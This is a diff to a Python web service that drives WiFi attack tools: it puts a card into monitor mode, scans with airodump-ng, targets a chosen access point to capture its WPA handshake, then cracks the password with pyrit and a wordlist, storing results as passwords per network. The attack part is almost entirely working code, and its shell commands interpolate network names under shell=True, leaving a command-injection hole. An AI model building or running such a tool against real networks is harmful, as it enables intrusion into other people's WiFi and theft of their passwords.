@@ -64,16 +64,17 @@ def setNetcardMon():
 @app.get('/stop')
 def stopNetcardMon():
     global scanning
+    global netcardMon
 
     try:
         scanning = False
-
         stopServices = f'killall airodump-ng | airmon-ng stop {netcardMon} && systemctl start NetworkManager.service'
         subprocess.run(stopServices, check=True, shell=True)
 
         clean(path)
         clean(path, True)
 
+        netcardMon = ""
         return ret({"status": "OK"})
 
     except Exception as e:
@@ -82,14 +83,15 @@ def stopNetcardMon():
 @app.get('/scan')
 def scan():
     global scanning 
+    global netcardMon
     clean(path)
     try:
+        if netcardMon == "": return ret({"status": f"Must have a netcard in monitor mode"}, 500)
         startScan = f'airodump-ng -w {path}/dumpData --output-format csv {netcardMon} > /dev/null'
         subprocess.Popen(startScan, shell=True)
 
         scanning = True
-        readScan()
-        #threading.Thread(target=readScan).start()
+        threading.Thread(target=readScan).start()
             
         return ret({"status":"OK"})
     except Exception as e:
@@ -115,11 +117,16 @@ def target():
 
 @app.post('/attack/<int:id>')
 def attack(id):
-    
-    clean(path, True)
+    global scanning
     try:
+        clean(path, True)
+        airodumpKill = 'killall airodump-ng'
+        subprocess.run(airodumpKill, check=True, shell=True)
+
         startScan = f'airodump-ng -w {path}/dumpDataAttack -c {channel} --bssid {bssid} {netcardMon} > {path}/tempScan'
-        process = subprocess.Popen(startScan, shell=True)
+        subprocess.Popen(startScan, shell=True)
+
+        scanning = False
 
         sleep(3)
 
@@ -179,13 +186,13 @@ def attack(id):
         waitHandshake(path)
         
         #Finish scan
-        process.terminate()
+        subprocess.run(airodumpKill, check=True, shell=True)
 
         #Comprobar handshake
         subprocess.run(f'pyrit -r {path}/dumpDataAttack-01.cap analyze', shell=True)
 
         #Guardar handshake
-        subprocess.run(f'cp {path}/dumpDataAttack-01.cap hashDB/{essid}_{bssid}.cap', shell=True)
+        subprocess.run(f'cp "{path}/dumpDataAttack-01.cap" "hashDB/{essid}&{bssid}.cap"', shell=True)
         
         return ret({"status":"OK"})
     except Exception as e:
@@ -212,12 +219,14 @@ def cracker(wordlist):
         # Generate PMKs
         generatePMKS = 'pyrit batch'
         subprocess.run(generatePMKS, check=True, shell=True)
-
+    
         # Start cracking
-        startCrack = f'pyrit -r hashDB/{hash} attack_db > {path}/{hash.replace(".cap", "")}'
+        password = hash.replace(".cap", "")
+
+        startCrack = f'pyrit -r hashDB/{hash} attack_db > {path}/{password}'
         subprocess.run(startCrack, check=True, shell=True)
 
-        extractPassword(f'{path}/{hash.replace(".cap", "")}', f'passDB/{hash.replace(".cap", "")}')
+        extractPassword(f'{path}/{password}', f'passDB/{password}')
 
         return ret({"status": "OK"})
 
@@ -263,11 +272,12 @@ def getLists(list):
         folder_path = join(parent_directory, list)
 
         file_list = [f for f in listdir(folder_path) if isfile(join(folder_path, f))]
+        print(file_list)
 
         if list == "passDB":
-            key_list = [{'apName': f.split('_')[0], 'bssid': f.split('_')[1].replace('.cap', ''), 'password': readPasswordFromFile(join(folder_path, f))} for f in file_list]
+            key_list = [{'apName': f.split('&')[0], 'bssid': f.split('&')[1], 'password': readPasswordFromFile(join(folder_path, f))} for f in file_list]
         elif list == "hashDB":
-            key_list = [{'apName': f.split('_')[0], 'bssid': f.split('_')[1].replace('.cap', ''), 'password': None} for f in file_list]
+            key_list = [{'apName': f.split('&')[0], 'bssid': f.split('&')[1].replace('.cap', ''), 'password': None} for f in file_list]
         else:
             key_list = file_list
 
